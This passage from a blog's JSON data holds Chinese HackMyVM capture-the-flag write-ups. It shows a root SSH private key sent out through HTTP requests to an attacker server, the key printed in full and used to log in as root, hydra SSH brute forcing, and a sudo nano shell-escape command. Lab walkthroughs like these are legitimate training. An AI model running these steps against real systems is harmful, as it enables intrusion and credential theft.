16:19:48] 'GET /wQDlr9NWE6q1BovNNobebvw44NdBRQE/1nesegFqlVdtKM61gHYWJotvLV79rjjRfjnGHo HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /0MoSXZXiC/0/CSfe6Je7unnIzhiA85jSe/u2dIviqItTc2CBRtOZl7Vrflt7lasT7J1WAO HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /1ROwaN5uL26gIgtf/Y7Rhi0wFPN289UI2gjeVQKhXBObVm3qY7yZh8JpLPH5w0Xeuo20sP HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /WchZl0D8KSZUKhlPU6Pibqmj9bAAm7hwFecuQMeS+nxg1qIGYAAADBAOZ1XurOyyH9RWIo HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /0sTQ3d/kJNgTNHAs4Y0SxSOejC+N3tEU33GU3P+ppfHYy595rX7MX4o3gqXFpAaHRIAupr HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /DbenB1HQW4o6Gg+SF2GWPAQeuDbCsLM9P8XOiQIjTuCvYwHUdFD7nWMJ5Sqr6EeBV+CYw1 HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Tg5PIU3FsnN5D3QOHVpGNo2qAvi+4CD0BC5fxOs6cZ1RBqbJ1kanw1H6fF8nRRBds+26Bl HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET //RGZHTBPLVenhNmWN2fje3GDBqVeIbZwAAAMEA2dfdjpefYEgtF0GMC9Sf5UzKIEKQMzoh HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /oxY6YRERurpcyYuSa/rxIP2uxu1yjIIcO4hpsQaoipTM0T9PS56CrO+FN9mcIcXCj5SVEq HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /2UVzu9LS0PdqPmniNmWglwvAbkktcEmbmCLYoh5GBxm9VhcL69dhzMdVe73Z9QhNXnMDlf HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /6xpD9lHWyp+ocD/meYC7V8aio/W9VxL25NlYwdFyCgecd/rIJQ+tGPXoqXIKrf5lVrVtFC HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /s8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s= HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /-----END HTTP/1.1' 404 -\n\n                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ awk -F 'GET /' '{print $2}' tmp | awk -F ' HTTP/1.1' '{print $1}' | grep -v '^\\s*$'\nrandomfile1\nfrand2\n-----BEGIN\n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\ns8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s=\n-----END\n                                                            \n```\n\n\u5c3d\u529b\u4e86\uff0c\u81ea\u5df1\u518d\u7f16\u8f91\u4e00\u4e0b\u5427\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat id_rsa\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEAxBvRe3EH67y9jIt2rwa79tvPDwmb2WmYv8czPn4bgSCpFmhDyHwn\nb0IUyyw3iPQ3LlTYyz7qEc2vaj1xqlDgtafvvtJ2EJAJCFy5osyaqbYKgAkGkQMzOevdGt\nxNQ8NxRO4/bC1v90lUrhyLi/ML5B4nak+5vLFJi8NlwXMQJ/xCWZg5+WOLduFp4VvHlwAf\ntDh2C+tJp2hqusW1jZRqSXspCfKLPt/v7utpDTKtofxFvSS55MFciju4dIaZLZUmiqoD4k\n/+FwJbMna8iPwmvK6n/2bOsE1+nyKbkbvDG5pjQ3VBtK23BVnlxU4frFrbicU+VtkClfMu\nyp7muWGA1ydvYUruoOiaURYupzuxw25Rao0Sb8nW1qDBYH3BETPCypezQXE22ZYAj0ThSl\nKn2aZN/8xWAB+/t96TcXogtSbQw/eyp9ecmXUpq5i1kBbFyJhAJs7x37WM3/Cb34a/6v8c\n9rMjGl9HMZFDwswzAGrvPOeroVB/TpZ+UBNGE1znAAAFgC5UADIuVAAyAAAAB3NzaC1yc2\nEAAAGBAMQb0XtxB+u8vYyLdq8Gu/bbzw8Jm9lpmL/HMz5+G4EgqRZoQ8h8J29CFMssN4j0\nNy5U2Ms+6hHNr2o9capQ4LWn777SdhCQCQhcuaLMmqm2CoAJBpEDMznr3RrcTUPDcUTuP2\nwtb/dJVK4ci4vzC+QeJ2pPubyxSYvDZcFzECf8QlmYOflji3bhaeFbx5cAH7Q4dgvrSado\narrFtY2Uakl7KQnyiz7f7+7raQ0yraH8Rb0kueTBXIo7uHSGmS2VJoqqA+JP/hcCWzJ2vI\nj8Jryup/9mzrBNfp8im5G7wxuaY0N1QbSttwVZ5cVOH6xa24nFPlbZApXzLsqe5rlhgNcn\nb2FK7qDomlEWLqc7scNuUWqNEm/J1tagwWB9wREzwsqXs0FxNtmWAI9E4UpSp9mmTf/MVg\nAfv7fek3F6ILUm0MP3sqfXnJl1KauYtZAWxciYQCbO8d+1jN/wm9+Gv+r/HPazIxpfRzGR\nQ8LMMwBq7zznq6FQf06WflATRhNc5wAAAAMBAAEAAAGAeX9uopbdvGx71wZUqo12iLOYLg\n3a87DbhP2KPw5sRe0RNSO10xEwcVq0fUfQxFXhlh/VDN7Wr98J7b1RnZ5sCb+Y5lWH9iz2\nm6qvDDDNJZX2HWr6GX+tDhaWLt0MNY5xr64XtxLTipZxE0n2Hueel18jNldckI4aLbAKa/\na4rL058j5AtMS6lBWFvqxZFLFr8wEECdBlGoWzkjGJkMTBsPLP8yzEnlipUxGgTR/3uSMN\npeiKDzLI/Y+QcQku/7GmUIV4ugP0fjMnz/XcXqe6GVNX/gvNeT6WfKPCzcaXiF4I2i228u\nTB9Ga5PNU2nYzJAQcAVvDwwC4IiNsDTdQY+cSOJ0KCcs2cq59EaOoZHY6Od88900V3MKFG\nTwielzW1Nqq1ltaQYMtnILxzEeXJFp6LlqFTF4Phf/yUyK04a6mhFg3kJzsxE+iDOVH28D\nUnj2OgO53KJ2FdLBHkUDlXMaDsISuizi0aj2MnhCryfHefhIsi1JdFyMhVuXCzNGUBAAAA\nwQDlr9NWE6q1BovNNobebvw44NdBRQE/1nesegFqlVdtKM61gHYWJotvLV79rjjRfjnGHo\n0MoSXZXiC/0/CSfe6Je7unnIzhiA85jSe/u2dIviqItTc2CBRtOZl7Vrflt7lasT7J1WAO\n1ROwaN5uL26gIgtf/Y7Rhi0wFPN289UI2gjeVQKhXBObVm3qY7yZh8JpLPH5w0Xeuo20sP\nWchZl0D8KSZUKhlPU6Pibqmj9bAAm7hwFecuQMeS+nxg1qIGYAAADBAOZ1XurOyyH9RWIo\n0sTQ3d/kJNgTNHAs4Y0SxSOejC+N3tEU33GU3P+ppfHYy595rX7MX4o3gqXFpAaHRIAupr\nDbenB1HQW4o6Gg+SF2GWPAQeuDbCsLM9P8XOiQIjTuCvYwHUdFD7nWMJ5Sqr6EeBV+CYw1\nTg5PIU3FsnN5D3QOHVpGNo2qAvi+4CD0BC5fxOs6cZ1RBqbJ1kanw1H6fF8nRRBds+26Bl\n/RGZHTBPLVenhNmWN2fje3GDBqVeIbZwAAAMEA2dfdjpefYEgtF0GMC9Sf5UzKIEKQMzoh\noxY6YRERurpcyYuSa/rxIP2uxu1yjIIcO4hpsQaoipTM0T9PS56CrO+FN9mcIcXCj5SVEq\n2UVzu9LS0PdqPmniNmWglwvAbkktcEmbmCLYoh5GBxm9VhcL69dhzMdVe73Z9QhNXnMDlf\n6xpD9lHWyp+ocD/meYC7V8aio/W9VxL25NlYwdFyCgecd/rIJQ+tGPXoqXIKrf5lVrVtFC\ns8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s=\n-----END OPENSSH PRIVATE KEY-----\n\n```\n\n\u4f20\u8fc7\u53bb\u8bd5\u8bd5\n\n```bash\ncris@crack:~$ cd /tmp/                                                                                                                                                                       \ncris@crack:/tmp$ wget 192.168.205.141/id_rsa                                                                                                                                                 \n--2025-01-23 09:32:12--  http://192.168.205.141/id_rsa                                                                                                                                       \nConectando con 192.168.205.141:80... conectado.                                                                                                                                              \nPetici\u00c3\u00b3n HTTP enviada, esperando respuesta... 200 OK                                                                                                                                         \nLongitud: 2590 (2,5K) [application/octet-stream]                                                                                                                                             \nGrabando a: \u00c2\u00abid_rsa\u00c2\u00bb                                                                                                                                                                         \n                                                                                                                                                                                             \nid_rsa                                          100%[======================================================================================================>]   2,53K  --.-KB/s    en 0s     \n                                                                                                                                                                                             \n2025-01-23 09:32:12 (427 MB/s) - \u00c2\u00abid_rsa\u00c2\u00bb guardado [2590/2590]                                                                                                                               \n                                                                                                                                                                                             \ncris@crack:/tmp$ chmod 600 id_rsa                                                                                                                                                            \ncris@crack:/tmp$ ssh root@127.0.0.1 -i id_rsa                                                                                                                                                \nThe authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.                                                                                                                       \nECDSA key fingerprint is SHA256:7z5F9pr6GN7gcEMbKUwipxWswKEpR9bMKOVzGc0V7/s.                                                                                                                 \nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes                                                                                                                     \nWarning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.                                                                                                                   \nLinux crack 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64                                                                                                                     \n                                                                                                                                                                                             \nThe programs included with the Debian GNU/Linux system are free software;                                                                                                                    \nthe exact distribution terms for each program are described in the                                                                                                                           \nindividual files in /usr/share/doc/*/copyright.                                                                                                                                              \n                                                                                                                                                                                             \nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent                                                                                                                            \npermitted by applicable law.                                                                                                                                                                 \nLast login: Wed Jun  7 22:11:49 2023                                                                                                                                                         \nroot@crack:~# id                                                                                                                                                                             \nuid=0(root) gid=0(root) grupos=0(root)                                                                                                                                                       \n```sentence", "top": 0, "createdAt": 1751016774, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P98": {"htmlDir": "docs/post/hmv_Darkside.html", "labels": ["HackMyVM"], "postTitle": "hmv_Darkside", "postUrl": "post/hmv_Darkside.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/98", "commentNum": 0, "wordCount": 7554, "description": "# hmv_Darkside\n\n# 0.\u7b80\u4ecb\n\n**\u9776\u673a**\uff1a[hackmyvm - Darkside](https://hackmyvm.eu/machines/machine.php?vm=Darkside)\n**\u96be\u5ea6**\uff1a\u7eff\u8272\n**\u76ee\u6807 IP**\uff1a192.168.205.134\n**\u672c\u673a IP**\uff1a192.168.205.141\n\n# 1.\u626b\u63cf\n\n\u4e00\u53f7\u7537\u5609\u5bbe\uff0c`nmap`\u5f00\u626b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.134\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-01-14 10:42 CST\nNmap scan report for 192.168.205.134\nHost is up (0.00078s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:2D:1C:16 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 2.69 seconds                                                 \n```\n\n\u4f18\u5148\u67e5\u770b**http\u670d\u52a1**\u7aef\u53e3\uff0c**ssh\u7aef\u53e3**\u5982\u679c\u6ca1\u6709\u8fdb\u5c55\u518d\u8fdb\u884c\u7206\u7834\n\n# 2.\u8e29\u70b9\n\n![image](https://github.com/user-attachments/assets/8432290e-d5d9-4863-9dfc-a43e9145b860)\n\n\u662f\u4e2a\u767b\u5f55\u9875\uff0c\u5c1d\u8bd5`sql\u6ce8\u5165\u3001\u4e07\u80fd\u5bc6\u7801\u3001\u5f31\u5bc6\u7801`\u5747\u65e0\u679c\uff0c\u4f7f\u7528`Nikto`\u8fdb\u884cWEB\u6f0f\u6d1e\u626b\u63cf\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nikto -h 192.168.205.134                       \n- Nikto v2.5.0\n---------------------------------------------------------------------------\n+ Target IP:          192.168.205.134\n+ Target Hostname:    192.168.205.134\n+ Target Port:        80\n+ Start Time:         2025-01-14 10:43:28 (GMT8)\n---------------------------------------------------------------------------\n+ Server: Apache/2.4.56 (Debian)\n+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options\n+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/\n+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies\n+ No CGI Directories found (use '-C all' to force check all possible dirs)\n+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.\n+ /backup/: Directory indexing found.\n+ /backup/: This might be interesting.\n+ 8102 requests: 0 error(s) and 6 item(s) reported on remote host\n+ End Time:           2025-01-14 10:43:50 (GMT8) (22 seconds)\n---------------------------------------------------------------------------\n+ 1 host(s) tested\n```\n\n\u6709\u4e2a\u5907\u4efd\u76ee\u5f55\uff0c\u6211\u4eec\u53bb\u7f51\u9875\u67e5\u770b\u4e00\u4e0b\n\n![image](https://github.com/user-attachments/assets/8432290e-d5d9-4863-9dfc-a43e9145b860)\n\n\u53ea\u6709\u4e00\u4e2a`vote.txt`\u6587\u672c\u6587\u4ef6\uff0c\u7ed9\u4e86\u6211\u4eec\u51e0\u4e2a\u7528\u6237\u540d\uff0c\u6211\u4eec\u62ff\u8fd9\u51e0\u4e2a\u7528\u6237\u540d\u53bb\u5c1d\u8bd5\u7206\u7834ssh\u670d\u52a1\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.134/backup/vote.txt|awk -F ':' '{print $1}'\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   205  100   205    0     0  69751      0 --:--:-- --:--:-- --:--:--  100k\nrijaba\nxerosec\nsml\ncromiphi\ngatogamer\nchema\ntalleyrand\nd3b0o\n\nSince the result was a draw, we will let you enter the darkside, or at least temporarily, good luck kevin.\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ vim user  \n                                      \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat user\nrijaba\nxerosec\nsml\ncromiphi\ngatogamer\nchema\ntalleyrand\nd3b0o\nkevin\n                  \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ hydra -L user -P /usr/share/wordlists/q5000.txt ssh://192.168.205.134 -I -u -f -e nsr -t 64 \n\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-14 11:04:45\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 64 tasks per 1 server, overall 64 tasks, 45027 login tries (l:9/p:5003), ~704 tries per task\n[DATA] attacking ssh://192.168.205.134:22/\n\n```\n\n\u7206\u7834\u7684\u540c\u65f6\uff0c\u6211\u4eec\u7528burp\u4e5f\u7206\u7834\u767b\u5f55\u9875\n\n![image](https://github.com/user-attachments/assets/b8ec81f2-f037-4bec-a27e-335aee5329d9)\n\n\u9009\u8fd9\u4e2a\uff0c\u8bbe\u7f6e\u597d\u53c2\u6570\u540e\u542f\u52a8\u7206\u7834\n\n![image](https://github.com/user-attachments/assets/f4a491ef-5970-4991-b5e2-83ae8de8d3c7)\n\n\u6309\u7167\u957f\u5ea6\u6392\u5e8f\uff0c\u53ef\u4ee5\u53d1\u73b0\u8be5\u7ec4\u7528\u6237\u5bc6\u7801\u957f\u5ea6\u660e\u7ec6\u4e0d\u4e00\u6837\uff0c\u5c1d\u8bd5\u767b\u5f55\n\n![image](https://github.com/user-attachments/assets/c0b9156f-bbb0-475f-920a-7ed966e0a230)\n\n\u83b7\u5f97\u4e86\u4e00\u4e32\u7c7b\u4f3c\u4e8ebase64\u7684\u5b57\u7b26\u4e32\uff0c\u62ff\u53bb[cyberchef](https://cyberchef.org/)\u89e3\u5bc6\n\n![image](https://github.com/user-attachments/assets/c0b9156f-bbb0-475f-920a-7ed966e0a230)\n\n\uff08\u5c34\u5c2c\u4e86\uff0c\u662fbase58\uff09\u8f93\u51fa\u4e86\u4e00\u4e32\u548c\u7f51\u5740\u5f88\u50cf\u7684\u5b57\u7b26\u4e32\uff0c\u6211\u4eec\u8bbf\u95ee\u4e00\u4e0b\n\n![image](https://github.com/user-attachments/assets/1b02d153-2df9-4f83-a249-714cf8196a93)\n\n\u95ee\u6211\u4eec\u9009\u54ea\u8fb9\uff0c\u6211\u4eec\u67e5\u770b\u6e90\u7801\n\n![image](https://github.com/user-attachments/assets/fe152899-e95a-4487-a6a3-69c1bdc75f10)\n\n\u4ee3\u7801\u662f\u5b9e\u73b0\u4e86\u5f53\u5b58\u5728\u540d\u4e3a **side** \u7684 **cookie** \u5e76\u4e14\u5b83\u7684\u503c\u662f `darkside`\uff0c\u90a3\u4e48\u811a\u672c\u5c06\u91cd\u5b9a\u5411\u7528\u6237\u5230 URL `hwvhysntovtanj.password`\uff0c\u6211\u61d2\u5f97\u6539**cookie**\u4e86\uff0c\u6211\u4eec\u76f4\u63a5\u8bbf\u95ee\n\n![image](https://github.com/user-attachments/assets/9bc27d36-69e8-4d83-a178-f695a8e598ce)\n\n\u83b7\u5f97\u4e86\u4e00\u4e2a\u8c8c\u4f3c\u662f**ssh\u670d\u52a1**\u5bc6\u7801\uff0c\u6211\u4eec\u5c1d\u8bd5\u4e00\u4e0b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ ssh kevin@192.168.205.134  \nThe authenticity of host '192.168.205.134 (192.168.205.134)' can't be established.\nED25519 key fingerprint is SHA256:pmPw9d2/o54jN+Dmo29Hq6rIzWOQ//VhyZvK4KN6rmk.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '192.168.205.134' (ED25519) to the list of known hosts.\nkevin@192.168.205.134's password: \nLinux darkside 5.10.0-26-amd64 #1 SMP Debian 5.10.197-1 (2023-09-29) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Sun Oct 15 15:18:15 2023 from 10.0.2.18\nkevin@darkside:~$ id\nuid=1000(kevin) gid=1000(kevin) groups=1000(kevin)\n```\n\n\u6210\u529f\u8fde\u63a5\n\n# 3.\u63d0\u6743\n\n```bash\nkevin@darkside:~$ sudo -l\n[sudo] password for kevin: \nSorry, user kevin may not run sudo on darkside.\nkevin@darkside:~$ \nkevin@darkside:~$ ls -la\ntotal 32\ndrwxr-xr-x 3 kevin kevin 4096 Oct 30  2023 .\ndrwxr-xr-x 4 root  root  4096 Oct 15  2023 ..\nlrwxrwxrwx 1 kevin kevin    9 Oct 30  2023 .bash_history -> /dev/null\n-rw-r--r-- 1 kevin kevin  220 Oct 15  2023 .bash_logout\n-rw-r--r-- 1 kevin kevin 3526 Oct 15  2023 .bashrc\n-rw-r--r-- 1 kevin kevin  113 Oct 15  2023 .history\ndrwxr-xr-x 3 kevin kevin 4096 Oct 15  2023 .local\n-rw-r--r-- 1 kevin kevin  807 Oct 15  2023 .profile\n-rw-r--r-- 1 kevin kevin   19 Oct 15  2023 user.txt\nkevin@darkside:~$ cat .history\nls -al\nhostname -I\necho 'Congratulations on the OSCP Xerosec'\ntop\nps -faux\nsu rijaba\nILoveJabita\nls /home/rijaba\n\n```\n\n\u5728\u5bb6\u76ee\u5f55\u53d1\u73b0\u4e86`.history`\u6587\u672c\u6587\u4ef6\uff0c\u67e5\u770b\u83b7\u5f97\u4e86`rijaba`\u7684\u5bc6\u7801\uff0c\u5c1d\u8bd5\u767b\u5f55\n\n```bash\nkevin@darkside:~$ su rijaba\nPassword: \nrijaba@darkside:/home/kevin$ id\nuid=1001(rijaba) gid=1001(rijaba) groups=1001(rijaba)\n```\n\n\u7ee7\u7eed\u6d4b\u8bd5\u63d0\u6743\n\n```bash\nrijaba@darkside:/home/kevin$ sudo -l\nMatching Defaults entries for rijaba on darkside:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser rijaba may run the following commands on darkside:\n    (root) NOPASSWD: /usr/bin/nano\n\n```\n\n\u53ef\u4ee5\u4f7f\u7528**root**\u8fd0\u884c`nano`\uff0c\u6211\u4eec\u8fdb\u884c\u63d0\u6743\n\n```bash\nrijaba@darkside:/home/kevin$ sudo /usr/bin/nano\n```\n\n![image](https://github.com/user-attachments/assets/68590d1b-033a-440d-8aea-5eff83ad1d78)\n\n\u8fdb\u5165`nano`\u6309**CTRL+R**\uff0c**CTRL+X**\uff0c\u8f93\u5165`reset; sh 1>&0 2>&0`\u5c31\u63d0\u6743\u6210\u529f\u4e86\n\n![image](https://github.com/user-attachments/assets/68590d1b-033a-440d-8aea-5eff83ad1d78)sentence", "top": 0, "createdAt": 1751016777, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P99": {"htmlDir": "docs/post/hmv_Deeper.html", "labels": ["HackMyVM"], "postTitle": "hmv_Deeper", "postUrl": "post/hmv_Deeper.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/99", "commentNum": 0, "wordCount": 5464, "description": "# hmv_Deeper\n\n# 0.\u7b80\u4ecb\n\n**\u9776\u673a**\uff1a[hackmyvm - Deeper](https://hackmyvm.eu/machines/machine.php?vm=Deeper)\n**\u96be\u5ea6**\uff1a\u7eff\u8272\n**\u76ee\u6807 IP**\uff1a192.168.205.143\n**\u672c\u673a IP**\uff1a192.168.205.141\n\n# 1.\u626b\u63cf\n\n`nmap`\u8d77\u624b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143 \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 16:34 CST\nNmap scan report for 192.168.205.143\nHost is up (0.00046s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:49:23:DF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.54 seconds\n```\n\n# 